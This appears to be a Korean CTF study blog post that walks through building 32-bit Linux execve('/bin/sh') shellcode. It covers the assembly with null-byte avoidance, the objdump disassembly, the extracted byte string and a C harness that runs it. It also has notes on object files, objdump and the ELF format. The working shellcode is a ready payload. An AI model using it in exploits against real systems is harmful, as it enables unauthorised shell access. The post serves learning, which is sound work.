---
layout: posts
title: "make shell"
categories: ["ctf"]
---

## Shellcode 만들기

```c
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}
```

```c
section .text
global _start

_start:
    ; 1. 레지스터 초기화
    xor eax, eax        ; EAX를 0으로 만듦
    push eax            ; 스택에 NULL(0)을 넣음 (문자열의 끝)

    ; 2. "/bin//sh" 문자열을 스택에 푸시 (8바이트를 맞추기 위해 // 사용)
    push 0x68732f2f     ; "hs//"
    push 0x6e69622f     ; "nib/"
    
    ; 3. EBX에 "/bin//sh"의 주소 설정
    mov ebx, esp        ; 현재 스택 포인터(문자열 시작점)를 EBX에 복사

    ; 4. ECX(argv)와 EDX(envp) 설정
    push eax            ; envp용 NULL
    mov edx, esp        ; EDX = NULL 주소
    push ebx            ; argv[0] = "/bin//sh" 주소
    mov ecx, esp        ; ECX = argv 배열의 주소

    ; 5. execve 호출 (EAX = 11)
    mov al, 11          ; EAX 전체 대신 하위 8비트(AL)에 11을 넣어 NULL 방지
    int 0x80            ; 커널 호출
```

→ null byte 제거

```c
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0422]
└─$ nasm -f elf32 32-bit.asm -o 32-bit.o

┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0422]
└─$ ls
32-bit.asm  32-bit.o

┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0422]
└─$ objdump -d 32-bit.o

32-bit.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 2f 2f 73 68          push   $0x68732f2f
   8:   68 2f 62 69 6e          push   $0x6e69622f
   d:   89 e3                   mov    %esp,%ebx
   f:   50                      push   %eax
  10:   89 e2                   mov    %esp,%edx
  12:   53                      push   %ebx
  13:   89 e1                   mov    %esp,%ecx
  15:   b0 0b                   mov    $0xb,%al
  17:   cd 80                   int    $0x80

┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0422]
└─$ hexdump -v -e '"\\" "x" /1 "%02x"' shell.bin
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

```c
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0422]
└─$ !g
gcc -m32 -fno-stack-protector -z execstack example.c -o test

┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0422]
└─$ cat ./example.c
#include <stdio.h>
#include <string.h>

int main() {
        char code[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
        printf("Shellcode Length: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}

┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0422]
└─$ ./test
Shellcode Length: 25
$ ls
32-bit.asm  32-bit.o  example.c  shell.bin  test
```

### Object 파일

Object 파일은 3가지로 분류될 수 있다.

- 재배치 가능한 object file (Relocatable object file)
- 실행 가능한 오브젝트 파일 (Executable Object file)
- 공유 오브젝트 파일 (Shared Object File)

### Objectdump

ELF나 object file(.o) 속 바이트코드(opcode)를 사람이 읽을 수 있는 어셈블리로 역변환한고, 섹션, 심볼, 헤더 정보를 덤프한다.

라이브러리, 컴파일된 오브젝트 모듈, 공유 오브젝트 파일, 독립 실행파일 등의 바이너리 파일들의 정보를 보여주는 프로그램이다.

objdump 는 ELF 파일을 어셈블리어로 보여주는 역어셈블러로 사용될 수 있다.

- 실제 메모리에 적재될 명령어를 확인해 최적화, 컴파일 오류를 검증한다.
- 펌웨가 올바른 주소에 로드됐는지 현장 디버깅에서 대조

자주 사용하는 옵션

- `objdump -d [파일명]`: **Disassemble.** 기계어를 다시 사람이 읽기 쉬운 어셈블리 코드로 역어셈블하여 보여준다.
- `objdump -h [파일명]`: 섹션 헤더 정보를 보여준다. (코드 영역과 데이터 영역의 크기 등 확인)
- `objdump -s [파일명]`: 섹션의 전체 내용을 16진수(Hex) 형태로 다 보여준다.

### ELF (Executable and Linkable Format)

: a standard binary file format for executables, object code, shared libraries, and core dumps on Unix-like systems

윈도우의 .exe 파일과 같은 역할을 한다.

단순히 기계어만 들어있는 게 아니라, 운영쳊가 이 파일을 어떻게 읽고 실행해야 하는지에 대한 설명서가 포함된 복합적인 구조체이다.

- ELF 의 주요 구성 요소
    - Header: 32-bit 인지 64-bit 인지, 어디서부터 코드가 시작되었는지 등의 정보가 담겨있다.
    - Sections
        - **`.text` :**  실제 실행될 기계어 코드가 들어있는 곳
        - **`.data` :** 초기화된 전역 변수들이 들어있는 곳
        - **`.rodata` :** 읽기 전용 데이터(문자열 등)가 들어있는 곳
    - Symbol Table: 함수 이름이나 변수 이름이 어느 주소에 있는 지 적혀 있는 index.
